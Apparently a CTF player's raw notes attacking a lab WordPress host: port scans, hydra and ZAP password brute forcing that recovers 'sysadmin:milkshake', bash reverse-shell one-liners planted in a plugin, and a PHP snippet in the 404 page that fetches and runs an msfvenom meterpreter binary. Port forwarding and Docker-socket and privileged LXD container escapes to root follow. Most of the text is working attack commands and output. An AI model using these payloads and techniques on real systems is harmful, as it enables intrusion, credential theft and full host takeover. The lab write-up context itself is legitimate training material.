```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.28.76                                                                                                                                               130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 11:53 EDT
Nmap scan report for 10.10.28.76
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE
22/tcp closed ssh		closed
80/tcp open   http		website

Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
```
 
 
 
robots.txt

User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php



```bash
┌──(kali㉿kali)-[~]
└─$ dirsearch -r -u 10.10.231.186           

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877

Output File: /home/kali/.dirsearch/reports/10.10.231.186/_21-06-10_08-55-14.txt

Error Log: /home/kali/.dirsearch/logs/errors-21-06-10_08-55-14.log

Target: http://10.10.231.186/

[08:55:16] Starting: 
[08:55:22] 301 -    0B  - /%2e%2e//google.com  ->  http://10.10.231.186/../google.com
[08:55:31] 403 -  278B  - /.ht_wsr.txt
[08:55:31] 403 -  278B  - /.htaccess.bak1
[08:55:31] 403 -  278B  - /.htaccess.orig
[08:55:31] 403 -  278B  - /.htaccess.sample
[08:55:31] 403 -  278B  - /.htaccess_orig
[08:55:31] 403 -  278B  - /.htaccess_extra
[08:55:31] 403 -  278B  - /.htaccess.save
[08:55:31] 403 -  278B  - /.htaccess_sc
[08:55:31] 403 -  278B  - /.htaccessBAK
[08:55:31] 403 -  278B  - /.htaccessOLD
[08:55:31] 403 -  278B  - /.htm
[08:55:31] 403 -  278B  - /.htaccessOLD2
[08:55:31] 403 -  278B  - /.html
[08:55:31] 403 -  278B  - /.htpasswd_test
[08:55:31] 403 -  278B  - /.httr-oauth
[08:55:31] 403 -  278B  - /.htpasswds
[08:55:46] 301 -    0B  - /0  ->  http://10.10.231.186/0/
[08:55:49] 301 -    0B  - /2020  ->  http://10.10.231.186/2020/
[08:55:55] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  http://10.10.231.186/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[08:55:59] 301 -    0B  - /New%20folder%20(2)  ->  http://10.10.231.186/New%20folder%20(2
[08:55:59] 301 -    0B  - /PMA2/index.php  ->  http://10.10.231.186/PMA2/
[08:55:59] 301 -    0B  - /PMA/index.php  ->  http://10.10.231.186/PMA/
[08:56:18] 301 -    0B  - /adm/index.php  ->  http://10.10.231.186/adm/
[08:56:19] 301 -    0B  - /admin.  ->  http://10.10.231.186/admin
[08:56:22] 301 -    0B  - /admin/index.php  ->  http://10.10.231.186/admin/
[08:56:22] 301 -    0B  - /admin/mysql2/index.php  ->  http://10.10.231.186/admin/mysql2/
[08:56:22] 301 -    0B  - /admin/mysql/index.php  ->  http://10.10.231.186/admin/mysql/
[08:56:23] 301 -    0B  - /admin/phpmyadmin2/index.php  ->  http://10.10.231.186/admin/phpmyadmin2/
[08:56:23] 301 -    0B  - /admin/phpMyAdmin/index.php  ->  http://10.10.231.186/admin/phpMyAdmin/
[08:56:23] 301 -    0B  - /admin/pma/index.php  ->  http://10.10.231.186/admin/pma/
[08:56:23] 301 -    0B  - /admin/PMA/index.php  ->  http://10.10.231.186/admin/PMA/
[08:56:23] 301 -    0B  - /admin/phpmyadmin/index.php  ->  http://10.10.231.186/admin/phpmyadmin/
[08:56:23] 301 -    0B  - /admin2/index.php  ->  http://10.10.231.186/admin2/
[08:56:25] 301 -    0B  - /admin_area/index.php  ->  http://10.10.231.186/admin_area/
[08:56:36] 301 -    0B  - /adminarea/index.php  ->  http://10.10.231.186/adminarea/
[08:56:38] 301 -    0B  - /admincp/index.php  ->  http://10.10.231.186/admincp/
[08:56:41] 301 -    0B  - /administrator/index.php  ->  http://10.10.231.186/administrator/
[08:56:48] 301 -    0B  - /apc/index.php  ->  http://10.10.231.186/apc/
[08:56:51] 301 -    0B  - /asset..  ->  http://10.10.231.186/asset
[08:56:51] 301 -    0B  - /atom  ->  http://10.10.231.186/feed/atom/
[08:56:55] 301 -    0B  - /bb-admin/index.php  ->  http://10.10.231.186/bb-admin/
[08:56:57] 301 -    0B  - /bitrix/admin/index.php  ->  http://10.10.231.186/bitrix/admin/
[08:57:03] 301 -    0B  - /claroline/phpMyAdmin/index.php  ->  http://10.10.231.186/claroline/phpMyAdmin/
[08:57:18] 301 -    0B  - /db/index.php  ->  http://10.10.231.186/db/
[08:57:18] 301 -    0B  - /dbadmin/index.php  ->  http://10.10.231.186/dbadmin/
[09:00:10] 301 -    0B  - /feed  ->  http://10.10.231.186/feed/
[09:00:19] 301 -    0B  - /html/js/misc/swfupload//swfupload.swf  ->  http://10.10.231.186/html/js/misc/swfupload/swfupload.swf
[09:00:21] 200 -   34B  - /images
[09:00:29] 301 -    0B  - /index.php  ->  http://10.10.231.186/
[09:00:36] 301 -    0B  - /index.php/login/  ->  http://10.10.231.186/login/
59.07% | 3 req/s - Errors: 541 - Last request to: installed.json
```

seems to be stuck there,,,


doing directory enumeration found this under /images

wordpress:php7.2-apache
mysql:5.7


 ```bash                                                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ searchsploit wordpress 7.2-apache
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                    | php/webapps/39553.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                            | php/webapps/48918.sh
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                     

                             
┌──(kali㉿kali)-[~]
└─$ curl -k --silent "http://10.10.231.186/claroline/phpMyAdmin/index.php?rest_route=3D/wpgmza/v1/markers/&filter=3D%7B%7D&=fields=3D*+from+wp_users+--+-"

{"code":"rest_no_route","message":"No route was found matching the URL and request method","data":{"status":404}}      

```
                                   
                            
tried the google with different directories no luck,,, but wait, there is a google link that looked weird,,,,hmmm


decided to do a proper nmap

 ```bash                                                                              
┌──(kali㉿kali)-[~]
└─$ nmap -sV -A -sC 10.10.231.186 -p80                                       130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 10:10 EDT
Nmap scan report for 10.10.231.186
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.4.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MilkCo Test/POC site &#8211; Just another WordPress site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.22 seconds
                                                                                   
┌──(kali㉿kali)-[~]
└─$ nmap --script=vuln 10.10.231.186 -p80
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 10:11 EDT
Nmap scan report for 10.10.231.186
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.231.186
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.231.186:80/
|     Form id: search-form-1
|     Form action: http:/
|     
|     Path: http://10.10.231.186:80/
|     Form id: search-form-2
|_    Form action: http:/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 5.4.2
|   /feed/: Wordpress version: 5.4.2
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|_  /0/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-wordpress-users: 
| Username found: sysadmin
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'

Nmap done: 1 IP address (1 host up) scanned in 66.86 seconds
```
we have a wp login site

http://10.10.231.186/wp-login.php

tried hydra not getting along with hydra today, going to zap it


 ```bash                                                                                 
┌──(kali㉿kali)-[~]
└─$ hydra -l sysadmin -P /usr/share/wordlists/rockyou500.txt http-post-form "/wp-login.php:user_login=sysadmin&user_pass=^PASS^:The password you entered for the username sysadmin is incorrect." http://10.10.231.186/
```

so the first thing I noticed is , the id is wrong

log=sysadmin&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2Fwp-admin%2F&testcookie=1
```bash
hydra -l sysadmin -P /usr/share/wordlists/rockyou500.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2Fwp-admin%2F&testcookie=1:The password you entered for the username sysadmin is incorrect." http://10.10.231.186/

hydra -l sysadmin -P /usr/share/wordlists/rockyou500.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2Fwp-admin%2F&testcookie=0:The password you entered for the username sysadmin is incorrect." http://10.10.231.186/

hydra -l sysadmin -P /usr/share/wordlists/rockyou500.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=true:'Error: The password you entered for the username sysadmin is incorrect.'" http://10.10.141.220/

```




ZAP Kicked ass!!!
```bash
1661	Fuzzed	302	Found	166	1148	0		{}	milkshake
0	Original	200	OK	224	441	4975		{}	
5	Fuzzed	200	OK	257	441	4975		{}	iloveyou
3	Fuzzed	200	OK	278	441	4975		{}	123456789
2	Fuzzed	200	OK	284	441	4975		{}	12345
1	Fuzzed	200	OK	298	441	4975		{}	123456
4	Fuzzed	200	OK	283	441	4975		{fuzz.httpfuzzerReflectionDetectorStateHighlighter.ReflectionData=[password]}	password
```

sysadmin:milkshake

```bash                                                                                 
┌──(kali㉿kali)-[~]
└─$ wpscan --url 10.10.141.20 --login-uri /wp-login.php --http-auth sysadmin:milkshake 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


Scan Aborted: The url supplied 'http://10.10.141.20/' seems to be down (Timeout was reached)

```


logged in and will try reverse shell on 404 page, 

and we get an error

Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.

On Linux, SFTP is often used as a command-line utility that supports both interactive and automated file transfers. Public key authentication can be used to fully automate logins for automated file transfers. However, proper lifecycle management of SSH keys is important to keep access under control.

aka ssh


tried on 404, not working, maybe different theme?

going to plugin, deactivate plug in before editing it. 
paste bash shell at end of file, don't delete php code (with no ending element???????????????????????????????????????)



exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.65.43/1234 0>&1'");


exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'")


```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234                                                                                                                                                    1 ⨯
listening on [any] 1234 ...
connect to [10.6.65.43] from (UNKNOWN) [10.10.4.66] 46160
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell



python -c 'import pty;pty.spawn("/bin/bash")'


got in, but no python, no flag, obviously no root, 



www-data@ba36769ccc47:/var/www/html/wp-admin$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

www-data@ce0442249805:/$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
<u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

-rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwxr-sr-x 1 root tty 34896 Jan 10  2019 /usr/bin/wall
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /bin/mount
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /bin/su
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /bin/umount
```

ran wpscan again, nothing, 

lokking up pivot, looks like I have to catch it with msf maybe, 

https://www.hackingarticles.in/wordpress-reverse-shell/


going into msf world

```bash
WordPress version: 5.4.2

msf6 > searchsploit WordPress 5.4.2
[*] exec: searchsploit WordPress 5.4.2

--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                    | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                              | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                            | php/webapps/48918.sh
```
for first shell in plugin
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.65.43/1234 0>&1'");

pivot to msf
sh -i >& /dev/tcp/10.6.65.43/9900 0>&1

```bash
running shell in msf found :
Found script at $ /usr/bin/script
[*] Using `script` to pop up an interactive shell
```





went to second write up,,, all in msf
https://aptx1337.github.io/posts/thm/forbusinessreasons.html

we make a meterpreter shell

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.6.65.43 LPORT=4444 -f elf > shell.elf

and serve it on 80
python3 -m http.server 80


we inject php into 404
```php
<?php
echo "[*] Check your meterpreter listener :\n";
system("curl 10.6.65.43/shell.elf --output /tmp/shell.elf");
system("chmod +x /tmp/shell.elf");
system("/tmp/shell.elf");
?>
```
in meterpreter shell ,
portfwd add -l 22 -p 22 -r 172.18.0.1

we need to make key
ssh-keygen -f "/hackme/scripts/.ssh/known_hosts" -R "127.0.0.1"

```bash
sysadmin@ubuntu:/tmp$ curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
[{"Containers":-1,"Created":1605921791,"Id":"sha256:ae0658fdbad5fb1c9413c998d8a573eeb5d16713463992005029c591e6400d02","Labels":null,"ParentId":"","RepoDigests":["mysql@sha256:8e2004f9fe43df06c3030090f593021a5f283d028b5ed5765cc24236c2c4d88e"],"RepoTags":["mysql:5.7"],"SharedSize":-1,"Size":448501465,"VirtualSize":448501465},

{"Containers":-1,"Created":1605762394,"Id":"sha256:cfb931188dab87aa1cb9da7b94068fecdb5d1f7e1372a381a7555b2acf3476f9","Labels":null,"ParentId":"","RepoDigests":["wordpress@sha256:92e97d9b3147038e3cc541a224cc951bef597061827e23a208a24c36bff1c1fe"],"RepoTags":["wordpress:latest"],"SharedSize":-1,"Size":545696702,"VirtualSize":545696702},

{"Containers":-1,"Created":1605761967,"Id":"sha256:82f0034f8ebeedbabd951bf5bf0c60d98554b635bd14b93ed88afcdf328f431b","Labels":null,"ParentId":"","RepoDigests":["wordpress@sha256:85ff99c249fb970f788b116848795447c37a6f4c13a300f9303fb1454b32c210"],"RepoTags":["wordpress:php7.2-apache"],"SharedSize":-1,"Size":541527500,"VirtualSize":541527500},

{"Containers":-1,"Created":1596768338,"Id":"sha256:d3bd49a68bba89420fc1759b197eb2dea9c8afcbb6ea1b6a59daecd1d5a0f972","Labels":null,"ParentId":"","RepoDigests":["wordpress@sha256:efaa511f811de855bcc1a8eafc58339cbf9a315ad95f419f829025631facf6a4"],"RepoTags":null,"SharedSize":-1,"Size":539327122,"VirtualSize":539327122},

{"Containers":-1,"Created":1596583240,"Id":"sha256:718a6da099d82183c064a964523c0deca80619cb033aadd15854771fe592a480","Labels":null,"ParentId":"","RepoDigests":["mysql@sha256:da58f943b94721d46e87d5de208dc07302a8b13e638cd1d24285d222376d6d84"],"RepoTags":null,"SharedSize":-1,"Size":448489152,"VirtualSize":448489152}]


sysadmin@ubuntu:/tmp$ 
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"d3bd49a68bba89420fc1759b197eb2dea9c8afcbb6ea1b6a59daecd1d5a0f972","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create{"Id":"237cb3a25fbbcf9b4bd397e6f4ef999552b2870620c09fa0da7ee2a060be2d6e","Warnings":null}

sysadmin@ubuntu:/tmp$ 
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/237cb3a25fbbcf9b4bd397e6f4ef999552b2870620c09fa0da7ee2a060be2d6e/start

```

wth
```bash
┌──(root💀kali)-[/hackme/scripts/alpine/lxd-alpine-builder]
└─# cd lxd-alpine-builder; ./build-alpine

┌──(root💀kali)-[/hackme/scripts/alpine/lxd-alpine-builder]
└─# scp alpine-v3.13-x86_64-20210615_1458.tar.gz sysadmin@127.0.0.1:/tmp/alpine-v3.13-x86_64-20210615_1458.tar.gz
sysadmin@127.0.0.1's password: 
alpine-v3.13-x86_64-20210615_1458.tar.gz         100% 3175KB  54.7KB/s   00:58    




sysadmin@ubuntu:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200831_1111.tar.gz --alias m3dsec
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

error: open ./alpine-v3.12-x86_64-20200831_1111.tar.gz: no such file or directory
sysadmin@ubuntu:/tmp$ lxc init m3dsec ignite -c security.privileged=true
Creating ignite
error: can't get info for image 'm3dsec': not found
sysadmin@ubuntu:/tmp$ lxc image import ./alpine-v3.12-x86_64-20210615_1458.tar.gz --alias m3dsec
error: open ./alpine-v3.12-x86_64-20210615_1458.tar.gz: no such file or directory
sysadmin@ubuntu:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210615_1458.tar.gz --alias m3dsec
Image imported with fingerprint: 6b616b0c18c5bb190d883dcd7adc8397f75cd287e07e4d20e5a257f8113b27a2
sysadmin@ubuntu:/tmp$ lxc image list
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| m3dsec | 6b616b0c18c5 | no     | alpine v3.13 (20210615_14:58) | x86_64 | 3.10MB | Jun 15, 2021 at 7:05pm (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
sysadmin@ubuntu:/tmp$ lxc init m3dsec ignite -c security.privileged=true
Creating ignite
sysadmin@ubuntu:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
sysadmin@ubuntu:/tmp$ lxc start ignite
sysadmin@ubuntu:/tmp$ lxc exec ignite /bin/sh
~ # whoami
root
~ # cd root
/bin/sh: cd: can't cd to root: No such file or directory
~ # cd /root
~ # ls
~ # dir
/bin/sh: dir: not found
~ # cd 
~ # cd /root
~ # ls
~ # ls -la
total 12
drwx------    2 root     root          4096 Jun 15 19:06 .
drwxr-xr-x   19 root     root          4096 Jun 15 19:06 ..
-rw-------    1 root     root            54 Jun 15 19:07 .ash_history
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
Kainiy1Onoonoh3j

```                                                              





